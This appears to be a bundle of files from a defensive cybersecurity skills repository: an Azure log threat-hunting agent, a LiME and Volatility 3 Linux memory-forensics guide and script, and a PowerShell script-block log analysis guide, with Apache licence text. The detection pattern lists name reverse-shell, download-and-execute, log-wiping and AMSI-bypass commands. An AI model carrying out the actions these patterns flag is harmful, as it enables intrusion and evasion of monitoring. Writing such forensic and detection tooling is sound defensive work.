    | where OperationNameValue endswith "/DELETE"
    | where ActivityStatusValue == "Success"
    | summarize DeleteCount = count(), Resources = make_set(Resource, 20)
                by Caller, bin(TimeGenerated, 1h)
    | where DeleteCount > 10
    | order by DeleteCount desc
    """
    return run_kql(credential, workspace_id, query)


def detect_conditional_access_changes(credential, workspace_id):
    """Detect modifications to Conditional Access policies."""
    query = """
    AuditLogs
    | where OperationName has_any (
        "Update conditional access policy",
        "Delete conditional access policy"
    )
    | project TimeGenerated, InitiatedBy, OperationName,
              TargetResources, Result
    | order by TimeGenerated desc
    """
    return run_kql(credential, workspace_id, query)


def main():
    parser = argparse.ArgumentParser(description="Azure Activity Log Threat Detection Agent")
    parser.add_argument("--workspace-id", default=os.getenv("AZURE_WORKSPACE_ID"))
    parser.add_argument("--tenant-id", default=os.getenv("AZURE_TENANT_ID"))
    parser.add_argument("--client-id", default=os.getenv("AZURE_CLIENT_ID"))
    parser.add_argument("--client-secret", default=os.getenv("AZURE_CLIENT_SECRET"))
    parser.add_argument("--output", default="azure_threat_report.json")
    parser.add_argument("--action", choices=[
        "privesc", "nsg", "keyvault", "travel", "deletion", "full_hunt"
    ], default="full_hunt")
    args = parser.parse_args()

    cred = get_credential(args.tenant_id, args.client_id, args.client_secret)
    report = {"generated_at": datetime.utcnow().isoformat(), "findings": {}}

    if args.action in ("privesc", "full_hunt"):
        results = detect_privilege_escalation(cred, args.workspace_id)
        report["findings"]["privilege_escalation"] = results
        print(f"[+] Privilege escalation events: {len(results)}")

    if args.action in ("nsg", "full_hunt"):
        results = detect_nsg_changes(cred, args.workspace_id)
        report["findings"]["nsg_changes"] = results
        print(f"[+] NSG changes: {len(results)}")

    if args.action in ("keyvault", "full_hunt"):
        results = detect_keyvault_access(cred, args.workspace_id)
        report["findings"]["keyvault_anomalies"] = results
        print(f"[+] Key Vault anomalies: {len(results)}")

    if args.action in ("travel", "full_hunt"):
        results = detect_impossible_travel(cred, args.workspace_id)
        report["findings"]["impossible_travel"] = results
        print(f"[+] Impossible travel: {len(results)}")

    if args.action in ("deletion", "full_hunt"):
        results = detect_resource_deletion(cred, args.workspace_id)
        report["findings"]["mass_deletion"] = results
        print(f"[+] Mass deletion events: {len(results)}")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/analyzing-memory-forensics-with-lime-and-volatility/SKILL.md =====
---
name: analyzing-memory-forensics-with-lime-and-volatility
description: 'Performs Linux memory acquisition using LiME (Linux Memory Extractor)
  kernel module and analysis with Volatility 3 framework. Extracts process lists,
  network connections, bash history, loaded kernel modules, and injected code from
  Linux memory images. Use when performing incident response on compromised Linux
  systems.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- memory-forensics
- linux-forensics
- lime
- volatility
- incident-response
- kernel-modules
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1055
- T1003.001
- T1620
- T1564.001
---

# Analyzing Memory Forensics with LiME and Volatility


## When to Use

- When investigating security incidents that require analyzing memory forensics with lime and volatility
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

Acquire Linux memory using LiME kernel module, then analyze with Volatility 3
to extract forensic artifacts from the memory image.

```bash
# LiME acquisition
insmod lime-$(uname -r).ko "path=/evidence/memory.lime format=lime"

# Volatility 3 analysis
vol3 -f /evidence/memory.lime linux.pslist
vol3 -f /evidence/memory.lime linux.bash
vol3 -f /evidence/memory.lime linux.sockstat
```

```python
import volatility3
from volatility3.framework import contexts, automagic
from volatility3.plugins.linux import pslist, bash, sockstat

# Programmatic Volatility 3 usage
context = contexts.Context()
automagics = automagic.available(context)
```

Key analysis steps:
1. Acquire memory with LiME (format=lime or format=raw)
2. List processes with linux.pslist, compare with linux.psscan
3. Extract bash command history with linux.bash
4. List network connections with linux.sockstat
5. Check loaded kernel modules with linux.lsmod for rootkits

## Examples

```bash
# Full forensic workflow
vol3 -f memory.lime linux.pslist | grep -v "\[kthread\]"
vol3 -f memory.lime linux.bash
vol3 -f memory.lime linux.malfind
vol3 -f memory.lime linux.lsmod
```

===== END FILE =====


===== FILE: skills/analyzing-memory-forensics-with-lime-and-volatility/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/analyzing-memory-forensics-with-lime-and-volatility/references/api-reference.md =====
# API Reference: Analyzing Memory Forensics with LiME and Volatility

## LiME (Linux Memory Extractor)

```bash
# Build LiME module
cd LiME/src && make

# Acquire memory (lime format - includes metadata)
insmod lime-$(uname -r).ko "path=/evidence/mem.lime format=lime"

# Acquire memory (raw format)
insmod lime-$(uname -r).ko "path=/evidence/mem.raw format=raw"

# Acquire over network
insmod lime.ko "path=tcp:4444 format=lime"
# On forensic workstation: nc target 4444 > mem.lime
```

## Volatility 3 Linux Plugins

| Plugin | Description |
|--------|-------------|
| `linux.pslist` | List processes via task_struct |
| `linux.psscan` | Brute-force scan for task_struct |
| `linux.bash` | Recovered bash command history |
| `linux.sockstat` | Network connections |
| `linux.lsmod` | Loaded kernel modules |
| `linux.malfind` | Detect injected code |
| `linux.check_afinfo` | Detect network hooking |
| `linux.tty_check` | Detect TTY hooking |
| `linux.proc.Maps` | Process memory maps |

## Volatility 3 CLI

```bash
vol3 -f memory.lime linux.pslist
vol3 -f memory.lime linux.bash
vol3 -f memory.lime linux.sockstat
vol3 -f memory.lime linux.malfind
vol3 -f memory.lime linux.lsmod
vol3 -f memory.lime linux.check_afinfo
```

## Hidden Process Detection

```bash
# Compare pslist (linked list) vs psscan (brute force)
vol3 -f mem.lime linux.pslist > pslist.txt
vol3 -f mem.lime linux.psscan > psscan.txt
diff pslist.txt psscan.txt
```

### References

- LiME: https://github.com/504ensicsLabs/LiME
- Volatility 3: https://github.com/volatilityfoundation/volatility3
- Volatility 3 docs: https://volatility3.readthedocs.io/

===== END FILE =====


===== FILE: skills/analyzing-memory-forensics-with-lime-and-volatility/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for Linux memory forensics using LiME acquisition and Volatility 3."""

import json
import subprocess
import argparse
from datetime import datetime
from pathlib import Path


def acquire_memory_lime(output_path, lime_format="lime"):
    """Acquire memory using LiME kernel module."""
    kernel_version = subprocess.run(
        ["uname", "-r"], capture_output=True, text=True, timeout=120
    ).stdout.strip()
    lime_module = f"lime-{kernel_version}.ko"
    if not Path(lime_module).exists():
        lime_module = "lime.ko"
    cmd = ["insmod", lime_module, f"path={output_path}", f"format={lime_format}"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    return {
        "status": "success" if result.returncode == 0 else "failed",
        "output_path": output_path,
        "format": lime_format,
        "kernel": kernel_version,
        "stderr": result.stderr,
    }


def run_vol3_plugin(image_path, plugin_name, extra_args=None):
    """Run a Volatility 3 plugin and capture output."""
    cmd = ["vol3", "-f", image_path, plugin_name]
    if extra_args:
        cmd.extend(extra_args)
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=300,
        )
        lines = result.stdout.strip().splitlines()
        return {"plugin": plugin_name, "output": lines, "error": result.stderr.strip()}
    except subprocess.TimeoutExpired:
        return {"plugin": plugin_name, "output": [], "error": "Timeout"}


def parse_pslist_output(lines):
    """Parse Volatility linux.pslist output into structured data."""
    processes = []
    for line in lines:
        parts = line.split()
        if len(parts) >= 4 and parts[0].isdigit():
            processes.append({
                "pid": int(parts[0]),
                "ppid": int(parts[1]) if parts[1].isdigit() else 0,
                "name": parts[-1],
            })
    return processes


def list_processes(image_path):
    """List all processes from memory image."""
    result = run_vol3_plugin(image_path, "linux.pslist")
    return parse_pslist_output(result.get("output", []))


def extract_bash_history(image_path):
    """Extract bash command history from memory."""
    result = run_vol3_plugin(image_path, "linux.bash")
    commands = []
    for line in result.get("output", []):
        parts = line.split(None, 3)
        if len(parts) >= 4 and parts[0].isdigit():
            commands.append({
                "pid": int(parts[0]),
                "name": parts[1],
                "timestamp": parts[2] if len(parts) > 2 else "",
                "command": parts[3] if len(parts) > 3 else "",
            })
    return commands


def list_network_connections(image_path):
    """List network connections from memory."""
    result = run_vol3_plugin(image_path, "linux.sockstat")
    connections = []
    for line in result.get("output", []):
        if "TCP" in line or "UDP" in line:
            connections.append(line.strip())
    return connections


def list_kernel_modules(image_path):
    """List loaded kernel modules to detect rootkits."""
    result = run_vol3_plugin(image_path, "linux.lsmod")
    modules = []
    for line in result.get("output", []):
        parts = line.split()
        if parts and not parts[0].startswith("Offset"):
            modules.append({"name": parts[-1] if parts else line.strip()})
    return modules


def detect_hidden_processes(image_path):
    """Compare pslist vs psscan to find hidden processes."""
    pslist = run_vol3_plugin(image_path, "linux.pslist")
    psscan = run_vol3_plugin(image_path, "linux.psscan")
    pslist_pids = set()
    for line in pslist.get("output", []):
        parts = line.split()
        if parts and parts[0].isdigit():
            pslist_pids.add(int(parts[0]))
    hidden = []
    for line in psscan.get("output", []):
        parts = line.split()
        if parts and parts[0].isdigit():
            pid = int(parts[0])
            if pid not in pslist_pids and pid > 0:
                hidden.append({"pid": pid, "line": line.strip()})
    return hidden


def detect_suspicious_commands(bash_history):
    """Flag suspicious commands in bash history."""
    suspicious_patterns = [
        "curl.*|.*sh", "wget.*&&.*chmod", "base64.*-d",
        "nc.*-e", "python.*-c.*import.*socket",
        "nohup", "rm.*-rf.*/var/log", "history.*-c",
        "iptables.*-F", "chmod.*777", "chattr.*-i",
    ]
    import re
    findings = []
    for entry in bash_history:
        cmd = entry.get("command", "")
        for pattern in suspicious_patterns:
            if re.search(pattern, cmd, re.IGNORECASE):
                findings.append({
                    "pid": entry["pid"],
                    "command": cmd,
                    "pattern": pattern,
                    "severity": "HIGH",
                })
                break
    return findings


def check_malfind(image_path):
    """Run malfind to detect injected code."""
    result = run_vol3_plugin(image_path, "linux.malfind")
    return result.get("output", [])


def main():
    parser = argparse.ArgumentParser(description="LiME + Volatility 3 Forensics Agent")
    parser.add_argument("--image", help="Path to memory image")
    parser.add_argument("--acquire", help="Output path for LiME acquisition")
    parser.add_argument("--output", default="memory_forensics_report.json")
    parser.add_argument("--action", choices=[
        "acquire", "pslist", "bash", "network", "modules",
        "hidden", "malfind", "full_analysis"
    ], default="full_analysis")
    args = parser.parse_args()

    report = {"generated_at": datetime.utcnow().isoformat(), "findings": {}}

    if args.action == "acquire" and args.acquire:
        result = acquire_memory_lime(args.acquire)
        report["findings"]["acquisition"] = result
        print(f"[+] Memory acquisition: {result['status']}")
        return

    if not args.image:
        print("[-] --image required for analysis actions")
        return

    if args.action in ("pslist", "full_analysis"):
        procs = list_processes(args.image)
        report["findings"]["processes"] = procs
        print(f"[+] Processes: {len(procs)}")

    if args.action in ("bash", "full_analysis"):
        history = extract_bash_history(args.image)
        report["findings"]["bash_history"] = history
        suspicious = detect_suspicious_commands(history)
        report["findings"]["suspicious_commands"] = suspicious
        print(f"[+] Bash commands: {len(history)}, Suspicious: {len(suspicious)}")

    if args.action in ("network", "full_analysis"):
        conns = list_network_connections(args.image)
        report["findings"]["connections"] = conns
        print(f"[+] Network connections: {len(conns)}")

    if args.action in ("modules", "full_analysis"):
        modules = list_kernel_modules(args.image)
        report["findings"]["kernel_modules"] = modules
        print(f"[+] Kernel modules: {len(modules)}")

    if args.action in ("hidden", "full_analysis"):
        hidden = detect_hidden_processes(args.image)
        report["findings"]["hidden_processes"] = hidden
        print(f"[+] Hidden processes: {len(hidden)}")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/analyzing-powershell-script-block-logging/SKILL.md =====
---
name: analyzing-powershell-script-block-logging
description: Parse Windows PowerShell Script Block Logs (Event ID 4104) from EVTX
  files to detect obfuscated commands, encoded payloads, and living-off-the-land techniques.
  Uses python-evtx to extract and reconstruct multi-block scripts, applies entropy
  analysis and pattern matching for Base64-encoded commands, Invoke-Expression abuse,
  download cradles, and AMSI bypass attempts.
domain: cybersecurity
subdomain: security-operations
tags:
- powershell
- script-block-logging
- event-id-4104
- obfuscation-detection
- windows-forensics
- endpoint-security
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1059.001
- T1027.010
- T1140
- T1105
---


# Analyzing PowerShell Script Block Logging


## When to Use

- When investigating security incidents that require analyzing powershell script block logging
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

1. Install dependencies: `pip install python-evtx lxml`
2. Collect PowerShell Operational logs: `Microsoft-Windows-PowerShell%4Operational.evtx`
3. Parse Event ID 4104 entries using python-evtx to extract ScriptBlockText, ScriptBlockId, and MessageNumber/MessageTotal for multi-part script reconstruction.
4. Apply detection heuristics:
   - Base64-encoded commands (`-EncodedCommand`, `FromBase64String`)
   - Download cradles (`DownloadString`, `DownloadFile`, `Invoke-WebRequest`, `Net.WebClient`)
   - AMSI bypass patterns (`AmsiUtils`, `amsiInitFailed`)
   - Obfuscation indicators (high entropy, tick-mark insertion, string concatenation)
5. Generate a report with reconstructed scripts, risk scores, and MITRE ATT&CK mappings.

```bash
python scripts/agent.py --evtx-file /path/to/PowerShell-Operational.evtx --output ps_analysis.json
```

## Examples

### Detect Encoded Command Execution
```python
import base64
if "-encodedcommand" in script_text.lower():
    encoded = script_text.split()[-1]
    decoded = base64.b64decode(encoded).decode("utf-16-le")
```

### Reconstruct Multi-Block Script
Scripts split across multiple 4104 events share a `ScriptBlockId`. Concatenate blocks ordered by `MessageNumber` to recover the full script.

===== END FILE =====


===== FILE: skills/analyzing-powershell-script-block-logging/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/analyzing-powershell-script-block-logging/references/api-reference.md =====
# API Reference: PowerShell Script Block Logging Analysis

## python-evtx Library

### FileHeader
```python
from Evtx.Evtx import FileHeader
with open(evtx_path, "rb") as f:
    fh = FileHeader(f)
    for record in fh.records():
        xml_string = record.xml()  # Returns XML string of the event
```

### Event XML Structure (Event ID 4104)
```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4104</EventID>
    <TimeCreated SystemTime="2024-01-15T10:30:00.000Z"/>
  </System>
  <EventData>
    <Data Name="MessageNumber">1</Data>
    <Data Name="MessageTotal">3</Data>
    <Data Name="ScriptBlockText">...powershell code...</Data>
    <Data Name="ScriptBlockId">guid-string</Data>
    <Data Name="Path">C:\script.ps1</Data>
  </EventData>
</Event>
```

## lxml etree Parsing
```python
from lxml import etree
NS = {"evt": "http://schemas.microsoft.com/win/2004/08/events/event"}
root = etree.fromstring(xml_bytes)
event_id = root.find(".//evt:System/evt:EventID", NS).text
data_elems = root.findall(".//evt:EventData/evt:Data", NS)
for elem in data_elems:
    name = elem.get("Name")
    value = elem.text
```

## Script Block Reconstruction
Large PowerShell scripts are split across multiple Event 4104 entries:
- `ScriptBlockId`: Unique GUID shared across all parts
- `MessageNumber`: Part index (1-based)
- `MessageTotal`: Total number of parts
- Reconstruct: concatenate parts ordered by MessageNumber

## Key Detection Patterns
| Pattern | MITRE | Risk |
|---------|-------|------|
| `-EncodedCommand` | T1059.001 | High |
| `FromBase64String` | T1140 | High |
| `Invoke-Expression` / `iex` | T1059.001 | High |
| `DownloadString` / `Net.WebClient` | T1105 | Critical |
| `AmsiUtils` / `amsiInitFailed` | T1562.001 | Critical |
| `Invoke-Mimikatz` | T1003 | Critical |
